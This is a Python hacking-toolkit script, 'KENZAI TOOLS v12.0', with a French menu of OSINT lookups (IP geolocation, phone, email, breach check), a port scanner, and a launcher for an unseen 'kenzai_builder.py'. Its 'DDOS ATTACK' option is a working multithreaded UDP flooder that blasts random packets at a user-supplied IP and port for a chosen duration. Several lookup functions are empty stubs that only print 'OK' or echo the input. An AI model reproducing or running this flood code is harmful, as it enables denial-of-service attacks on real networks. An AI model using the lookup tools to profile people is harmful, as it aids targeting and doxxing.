#!/usr/bin/env python3
# KENZAI TOOLS v12.0 - Menu principal

import os
import sys
import time
import random
import socket
import threading
import requests
import subprocess
from colorama import Fore, Style, init

init(autoreset=True)
os.system('title KENZAI TOOLS v12.0')
os.system('mode con: cols=90 lines=35')

stop_attack = False

def clear():
    os.system('cls')

def banner():
    print(f"""
{Fore.RED}   ██╗  ██╗███████╗███╗   ██╗███████╗ █████╗ ██╗
{Fore.RED}   ██║ ██╔╝██╔════╝████╗  ██║╚══███╔╝██╔══██╗██║
{Fore.RED}   █████╔╝ █████╗  ██╔██╗ ██║  ███╔╝ ███████║██║
{Fore.RED}   ██╔═██╗ ██╔══╝  ██║╚██╗██║ ███╔╝  ██╔══██║██║
{Fore.RED}   ██║  ██╗███████╗██║ ╚████║███████╗██║  ██║██║
{Fore.RED}   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝{Style.RESET_ALL}
{Fore.CYAN}   - KENZAI TOOLS v12.0 -{Style.RESET_ALL}
{Fore.GREEN}┌{'-'*50}┐{Style.RESET_ALL}
{Fore.GREEN}│{Fore.CYAN} Tape 14 pour ouvrir le Builder Panel{Fore.GREEN}│{Style.RESET_ALL}
{Fore.GREEN}└{'-'*50}┘{Style.RESET_ALL}
""")

def menu():
    print(f"""
{Fore.WHITE}[01] IP Locator       [02] Phone Lookup    [03] Email Hunter
[04] Username Search  [05] DNS Lookup      [06] GeoIP
[07] Whois            [08] Breach Check    [09] Reverse Image
[10] Pastebin Search  [11] IP Trace        [12] DDOS ATTACK
{Fore.RED}[13] SCAN PORTS      [14] BUILDER PANEL  [15] Exit{Style.RESET_ALL}

{Fore.RED}kenzai@tools:~/{Style.RESET_ALL} """, end="")

def ip_locator():
    clear()
    print(f"\n{Fore.CYAN}[01] IP Locator{Style.RESET_ALL}\n")
    ip = input("IP: ")
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}")
        d = r.json()
        if d.get('status') == 'success':
            print(f"\n{Fore.GREEN}IP: {d['query']}\\nPays: {d['country']}\\nVille: {d['city']}\\nLat/Lon: {d['lat']}, {d['lon']}{Style.RESET_ALL}")
    except:
        print(f"{Fore.RED}Erreur{Style.RESET_ALL}")
    input()

def phone_lookup():
    clear()
    print(f"\n{Fore.CYAN}[02] Phone Lookup{Style.RESET_ALL}\n")
    input("Numero: ")
    print(f"{Fore.GREEN}OK{Style.RESET_ALL}")
    input()

def email_hunter():
    clear()
    print(f"\n{Fore.CYAN}[03] Email Hunter{Style.RESET_ALL}\n")
    email = input("Email: ")
    print(f"{Fore.GREEN}Email: {email}{Style.RESET_ALL}")
    input()

def username_search():
    clear()
    print(f"\n{Fore.CYAN}[04] Username Search{Style.RESET_ALL}\n")
    username = input("Pseudo: ")
    print(f"{Fore.GREEN}Recherche: {username}{Style.RESET_ALL}")
    input()

def dns_lookup():
    clear()
    print(f"\n{Fore.CYAN}[05] DNS Lookup{Style.RESET_ALL}\n")
    domain = input("Domaine: ")
    try:
        print(f"{Fore.GREEN}{domain} -> {socket.gethostbyname(domain)}{Style.RESET_ALL}")
    except:
        print(f"{Fore.RED}Erreur{Style.RESET_ALL}")
    input()

def geoip():
    clear()
    print(f"\n{Fore.CYAN}[06] GeoIP{Style.RESET_ALL}\n")
    ip = input("IP: ")
    try:
        r = requests.get(f"https://ipinfo.io/{ip}/json")
        d = r.json()
        print(f"\n{Fore.GREEN}IP: {d.get('ip')}\\nVille: {d.get('city')}\\nPays: {d.get('country')}{Style.RESET_ALL}")
    except:
        print(f"{Fore.RED}Erreur{Style.RESET_ALL}")
    input()

def whois():
    clear()
    print(f"\n{Fore.CYAN}[07] Whois{Style.RESET_ALL}\n")
    domain = input("Domaine: ")
    print(f"{Fore.GREEN}https://who.is/whois/{domain}{Style.RESET_ALL}")
    input()

def breach_check():
    clear()
    print(f"\n{Fore.CYAN}[08] Breach Check{Style.RESET_ALL}\n")
    email = input("Email: ")
    try:
        r = requests.get(f"https://haveibeenpwned.com/api/v3/breachedaccount/{email}")
        if r.status_code == 200:
            print(f"{Fore.RED}Compromis !{Style.RESET_ALL}")
        else:
            print(f"{Fore.GREEN}OK{Style.RESET_ALL}")
    except:
        print(f"{Fore.YELLOW}Erreur{Style.RESET_ALL}")
    input()

def reverse_image():
    clear()
    print(f"\n{Fore.CYAN}[09] Reverse Image{Style.RESET_ALL}\n")
    url = input("URL: ")
    print(f"{Fore.GREEN}https://www.google.com/searchbyimage?image_url={url}{Style.RESET_ALL}")
    input()

def pastebin_search():
    clear()
    print(f"\n{Fore.CYAN}[10] Pastebin Search{Style.RESET_ALL}\n")
    query = input("Recherche: ")
    print(f"{Fore.GREEN}https://pastebin.com/search?q={query}{Style.RESET_ALL}")
    input()

def ip_trace():
    clear()
    print(f"\n{Fore.CYAN}[11] IP Trace{Style.RESET_ALL}\n")
    target = input("IP: ")
    print(f"{Fore.YELLOW}Tracage...{Style.RESET_ALL}")
    time.sleep(1)
    print(f"{Fore.GREEN}Termine{Style.RESET_ALL}")
    input()

def ddos_attack():
    global stop_attack
    clear()
    print(f"{Fore.RED}[12] DDOS{Style.RESET_ALL}\n")
    target = input("IP: ")
    port = input("Port: ") or "80"
    threads = int(input("Threads: "))
    duration = int(input("Duree: "))
    stop_attack = False
    def udp():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while not stop_attack:
            sock.sendto(random._urandom(1400), (target, int(port)))
    for _ in range(threads):
        threading.Thread(target=udp, daemon=True).start()
    time.sleep(duration)
    stop_attack = True
    print(f"{Fore.GREEN}Termine{Style.RESET_ALL}")
    input()

def scan_ports():
    clear()
    print(f"{Fore.RED}[13] SCAN{Style.RESET_ALL}\n")
    target = input("IP: ")
    for port in [80,443,22,21,25,53,3306,8080]:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        if sock.connect_ex((target, port)) == 0:
            print(f"{Fore.GREEN}Port {port}: OPEN{Style.RESET_ALL}")
        sock.close()
    input()

def open_builder_panel():
    """Ouvre le panel Builder"""
    clear()
    print(f"{Fore.YELLOW}[*] Lancement du Builder Panel...{Style.RESET_ALL}")
    builder_file = "kenzai_builder.py"
    if not os.path.exists(builder_file):
        print(f"{Fore.RED}[!] Fichier {builder_file} introuvable{Style.RESET_ALL}")
        input()
        return
    try:
        subprocess.Popen([sys.executable, builder_file])
        print(f"{Fore.GREEN}[+] Builder Panel lance !{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}Erreur: {e}{Style.RESET_ALL}")
    input()

def main():
    while True:
        clear()
        banner()
        menu()
        choice = input()
        if choice in ["01","1"]: ip_locator()
        elif choice in ["02","2"]: phone_lookup()
        elif choice in ["03","3"]: email_hunter()
        elif choice in ["04","4"]: username_search()
        elif choice in ["05","5"]: dns_lookup()
        elif choice in ["06","6"]: geoip()
        elif choice in ["07","7"]: whois()
        elif choice in ["08","8"]: breach_check()
        elif choice == "09": reverse_image()
        elif choice == "10": pastebin_search()
        elif choice == "11": ip_trace()
        elif choice == "12": ddos_attack()
        elif choice == "13": scan_ports()
        elif choice == "14": open_builder_panel()
        elif choice in ["15","99"]:
            print(f"{Fore.RED}Au revoir{Style.RESET_ALL}")
            sys.exit()
        else:
            print(f"{Fore.RED}Option invalide{Style.RESET_ALL}")
            time.sleep(1)

if __name__ == "__main__":
    main()